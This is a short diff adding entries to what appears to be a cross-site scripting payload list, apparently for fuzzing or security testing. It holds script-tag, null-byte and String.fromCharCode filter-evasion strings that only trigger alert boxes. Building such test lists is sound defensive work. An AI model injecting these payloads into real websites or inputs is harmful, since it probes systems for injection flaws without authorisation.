@@ -1,3 +1,7 @@
+<script>alert("xss")</script>
+<script>alert(1);</script>
+<%00script>alert(1);</%00script>
+SCRIPT>alert("XSS");///SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
 //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
